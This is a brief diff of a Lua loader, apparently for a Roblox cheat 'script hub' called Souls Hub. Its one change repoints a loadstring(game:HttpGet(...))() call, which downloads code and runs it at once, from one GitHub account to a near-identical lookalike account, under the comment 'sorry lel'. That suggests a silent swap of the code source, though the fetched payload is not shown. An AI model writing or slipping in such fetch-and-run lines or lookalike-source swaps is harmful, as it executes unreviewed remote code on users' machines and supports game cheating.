@@ -1,6 +1,6 @@
 -- sorry lel
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/WhatsHisIdentifier/NoKey/refs/heads/main/Discord",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WhatsHisIdentifierr/NoKey/refs/heads/main/Discord",true))()
 
 if getgenv().soulsHub then
     warn("Souls Hub: Already executed!")
